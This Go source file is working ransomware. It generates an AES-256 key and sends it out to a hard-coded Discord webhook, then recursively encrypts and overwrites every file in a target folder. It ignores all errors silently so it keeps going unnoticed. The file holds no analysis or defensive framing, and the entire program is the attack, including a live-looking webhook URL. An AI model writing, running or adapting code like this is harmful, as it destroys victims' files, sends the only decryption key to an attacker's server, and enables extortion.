package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

// Encrypts file content
func encryptFile(filePath string, key []byte) error {
	// Read file content
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil // Silently ignore the error and continue
	}

	// Create AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil // Silently ignore the error and continue
	}

	// Correct nonce length for GCM (12 bytes)
	nonce := make([]byte, 12) // AES-GCM uses 12 bytes for nonce
	_, err = rand.Read(nonce)
	if err != nil {
		return nil // Silently ignore the error and continue
	}

	// AES-GCM encryption
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil // Silently ignore the error and continue
	}

	ciphertext := aesGCM.Seal(nil, nonce, data, nil)

	// Save encrypted content back to the file
	encryptedData := append(nonce, ciphertext...)
	err = ioutil.WriteFile(filePath, encryptedData, 0644)
	if err != nil {
		return nil // Silently ignore the error and continue
	}

	return nil
}

// Walk through the folder and encrypt all files
func encryptFilesInFolder(folderPath string, key []byte) error {
	return filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// Silently ignore the error if it's an access denied error or any other error
			if os.IsPermission(err) {
				return nil // Skip and continue processing other files
			}
			return nil // Silently continue even if it's another type of error
		}
		if !info.IsDir() {
			// Try to encrypt the file and silently continue if there's an error
			err := encryptFile(path, key)
			if err != nil {
				return nil // Silently continue if encryption failed
			}
		}
		return nil
	})
}

// Send the AES key to Discord via webhook
func sendDecryptionKeyToDiscord(key string) error {
	webhookURL := "https://discord.com/api/webhooks/1295679771983872000/BG5rg1ZTH7EWxZGzo3uKYAzzeeWBHQlGDvQXbCfYfLZCJBx1KGy0pPL6q3WiFPXsCSGk" // Replace with your Discord webhook URL
	message := fmt.Sprintf("Decryption Key: %s", key)

	// JSON payload to send the message
	payload := []byte(`{"content": "` + message + `"}`)
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
	if err != nil {
		return nil // Silently ignore the error
	}
	req.Header.Set("Content-Type", "application/json")

	// Send the request
	client := &http.Client{}
	_, err = client.Do(req)
	if err != nil {
		return nil // Silently ignore the error
	}

	return nil
}

// Generate random AES key (32 bytes for AES-256)
func generateKey() ([]byte, error) {
	key := make([]byte, 32) // AES-256 key size
	_, err := rand.Read(key)
	if err != nil {
		return nil, nil // Silently ignore the error
	}
	return key, nil
}

func main() {
	folderPath := "C:/Users/hugo/Desktop/test" // Replace with the folder path you want to encrypt

	// Generate a random AES key
	key, err := generateKey()
	if err != nil {
		return // Silently exit if there is an error
	}

	// Convert the key to a hex string for sending to Discord
	keyHex := hex.EncodeToString(key)

	// Send the key to Discord
	err = sendDecryptionKeyToDiscord(keyHex)
	if err != nil {
		return // Silently exit if there is an error
	}

	// Encrypt all files in the folder
	err = encryptFilesInFolder(folderPath, key)
	if err != nil {
		return // Silently exit if there is an error
	}

	// Optionally, you could include a success message if needed, but this is skipped in your case.
	// fmt.Println("Encryption complete. Decryption key sent to Discord.")
}
